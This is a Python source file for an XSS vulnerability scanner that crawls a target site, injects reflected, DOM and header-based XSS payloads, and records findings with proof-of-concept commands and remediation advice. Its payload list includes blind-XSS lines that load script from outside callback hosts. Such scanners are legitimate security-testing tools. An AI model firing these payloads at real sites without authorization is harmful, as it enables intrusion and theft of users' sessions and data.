#!/usr/bin/env python3
"""XSS Scanner - Reflected, Stored, DOM XSS detection"""
import requests
import re
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

class XSSScanner:
    def __init__(self, target, scan_id, socketio, log_fn, finding_fn):
        self.target = target.rstrip('/')
        self.scan_id = scan_id
        self.log = log_fn
        self.add_finding = finding_fn
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 BugHunterPro/2.0'})
        
        # XSS Payload arsenal
        self.payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "';alert(1)//",
            '</script><script>alert(1)</script>',
            '<body onload=alert(1)>',
            '{{7*7}}',  # Template injection
            '<math><mtext></table><img src=x onerror=alert(1)>',
            # CSP bypass
            '<script src=//xss.report/c/BugHunterPro></script>',
            # mXSS
            '<listing><script>alert(1)</script>',
        ]
        
        # Blind XSS payload
        self.blind_payload = '<script src="https://your-xss-callback.com/c/bughunterpro"></script>'

    def run(self):
        self.log(self.scan_id, "💉 Testing XSS vulnerabilities...", 'info', 'xss')
        
        # Crawl for parameters
        params_found = self._find_parameters()
        
        if not params_found:
            # Test common endpoints with params
            params_found = self._get_default_targets()
        
        # Test each param
        for url_info in params_found[:30]:
            self._test_url(url_info)
        
        # Test specific injection points
        self._test_dom_xss()
        self._test_header_injection()
        
        self.log(self.scan_id, "  ✅ XSS scan complete", 'info', 'xss')

    def _find_parameters(self):
        self.log(self.scan_id, "  🔍 Crawling for parameters...", 'info', 'xss')
        found = []
        
        try:
            r = self.session.get(self.target, timeout=8)
            # Extract URLs with parameters from HTML
            urls = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', r.text)
            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', r.text, re.IGNORECASE)
            
            for url in urls[:20]:
                if not url.startswith('http'):
                    url = urljoin(self.target, url)
                parsed = urlparse(url)
                if parsed.query:
                    params = parse_qs(parsed.query)
                    found.append({'url': url, 'params': list(params.keys()), 'method': 'GET'})
                    self.log(self.scan_id, f"  📎 Found param URL: {url[:80]}", 'data', 'xss')
            
            for form_url in forms[:5]:
                if not form_url.startswith('http'):
                    form_url = urljoin(self.target, form_url)
                found.append({'url': form_url, 'params': ['q', 'search', 'input', 'name'], 'method': 'GET'})
        except:
            pass
        
        return found

    def _get_default_targets(self):
        common_endpoints = [
            f"{self.target}/search?q=",
            f"{self.target}/search?query=",
            f"{self.target}/?s=",
            f"{self.target}/api/search?q=",
            f"{self.target}/find?keyword=",
            f"{self.target}/results?search=",
        ]
        
        targets = []
        for ep in common_endpoints:
            try:
                r = self.session.get(ep + "test", timeout=4)
                if r.status_code == 200:
                    parsed = urlparse(ep)
                    params = parse_qs(parsed.query) if '?' in ep else {}
                    targets.append({
                        'url': ep,
                        'params': list(params.keys()) or ['q'],
                        'method': 'GET'
                    })
            except:
                pass
        
        return targets

    def _test_url(self, url_info):
        url = url_info['url']
        params = url_info.get('params', [])
        
        for param in params:
            for payload in self.payloads[:8]:
                try:
                    # Build test URL
                    if '?' in url:
                        test_url = url + f"&{param}=" + requests.utils.quote(payload)
                    else:
                        test_url = url + f"?{param}=" + requests.utils.quote(payload)
                    
                    r = self.session.get(test_url, timeout=5)
                    
                    # Check if payload reflected
                    if payload in r.text or payload.lower() in r.text.lower():
                        # Check if it's inside HTML context (not just text)
                        content_type = r.headers.get('Content-Type', '')
                        if 'html' in content_type:
                            self.log(self.scan_id,
                                f"  🚨 XSS REFLECTED: {param}={payload[:30]} in {url[:60]}", 
                                'critical', 'xss')
                            
                            self.add_finding(self.scan_id, {
                                'type': 'Cross-Site Scripting (XSS)',
                                'subtype': 'Reflected',
                                'severity': 'high',
                                'target': url,
                                'parameter': param,
                                'description': f'Reflected XSS vulnerability in parameter "{param}"',
                                'evidence': f'Parameter: {param}\nPayload: {payload}\nURL: {test_url}\nReflected in response body',
                                'cvss': 7.4,
                                'poc': f'curl -s "{test_url}" | grep -o "{payload[:20]}.*"',
                                'poc_html': f'<a href="{test_url}">Click to trigger XSS</a>',
                                'remediation': 'Implement output encoding. Use DOMPurify for user-controlled data. Set Content-Security-Policy.',
                                'cwe': 'CWE-79'
                            })
                            break
                except:
                    pass

    def _test_dom_xss(self):
        self.log(self.scan_id, "  🌐 Testing DOM-based XSS sinks...", 'info', 'xss')
        
        dom_sinks = [
            f"{self.target}/#<img src=x onerror=alert(1)>",
            f"{self.target}/?ref=javascript:alert(1)",
            f"{self.target}/?redirect=javascript:alert(1)",
        ]
        
        for url in dom_sinks:
            try:
                r = self.session.get(url, timeout=4)
                if r.status_code == 200:
                    # Look for DOM sinks in JS
                    js_patterns = [
                        r'innerHTML\s*=',
                        r'document\.write\(',
                        r'eval\(',
                        r'setTimeout\(["\']',
                        r'location\.hash',
                        r'document\.location',
                    ]
                    for pattern in js_patterns:
                        if re.search(pattern, r.text):
                            self.log(self.scan_id, 
                                f"  ⚠️ DOM sink detected: {pattern} in {url[:60]}", 
                                'warning', 'xss')
            except:
                pass

    def _test_header_injection(self):
        self.log(self.scan_id, "  📋 Testing header-based XSS...", 'info', 'xss')
        
        # Test X-Forwarded-For reflection
        xss_payload = '<script>alert(1)</script>'
        headers_to_test = {
            'X-Forwarded-For': xss_payload,
            'User-Agent': xss_payload,
            'Referer': f"{self.target}/?{xss_payload}",
        }
        
        try:
            for header, value in headers_to_test.items():
                r = self.session.get(self.target, 
                                      headers={header: value}, timeout=5)
                if xss_payload in r.text:
                    self.add_finding(self.scan_id, {
                        'type': 'Header-based XSS',
                        'severity': 'high',
                        'target': self.target,
                        'description': f'XSS via {header} header',
                        'evidence': f'Header: {header}: {value}\nReflected in response',
                        'cvss': 7.4,
                        'poc': f'curl -H "{header}: {value}" {self.target}',
                        'cwe': 'CWE-79'
                    })
        except:
            pass
